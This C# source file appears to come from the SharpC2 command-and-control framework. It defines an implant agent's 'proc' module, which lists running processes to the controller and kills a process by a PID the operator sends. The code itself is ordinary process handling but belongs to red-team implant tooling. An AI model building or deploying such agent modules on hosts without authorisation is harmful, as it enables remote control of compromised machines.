using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;

namespace Agent.Modules
{
    class ProcessModule : IAgentModule
    {
        AgentController Agent;
        ConfigController Config;

        public void Init(AgentController agent, ConfigController config)
        {
            Agent = agent;
            Config = config;
        }

        public AgentModuleInfo GetModuleInfo()
        {
            return new AgentModuleInfo
            {
                Name = "proc",
                Description = "Processes",
                Developers = new List<Developer>
                {
                    new Developer { Name = "Daniel Duggan", Handle = "@_RastaMouse" },
                    new Developer { Name = "Adam Chester", Handle = "@_xpn_" }
                },
                Commands = new List<AgentCommand>
                {
                    new AgentCommand
                    {
                        Name = "list",
                        Description = "Get running processes",
                        HelpText = "proc list",
                        CallBack = GetRunningProcesses
                    },
                    new AgentCommand
                    {
                        Name = "kill",
                        Description = "Kill a process",
                        HelpText = "proc kill [pid]",
                        CallBack = KillProcess
                    },
                }
            };
        }

        private void GetRunningProcesses(byte[] data)
        {
            try
            {
                var result = new SharpC2ResultList<ProcessListResult>();
                var processes = Process.GetProcesses().OrderBy(p => p.Id);
                foreach (var process in processes)
                {
                    result.Add(new ProcessListResult
                    {
                        PID = process.Id,
                        Name = process.ProcessName,
                        Session = process.SessionId
                    });
                }

                Agent.SendOutput(result.ToString());
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        private void KillProcess(byte[] data)
        {
            try
            {
                var pid = int.Parse(Encoding.UTF8.GetString(data));
                var process = Process.GetProcessById(pid);
                process.Kill();
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }
    }
}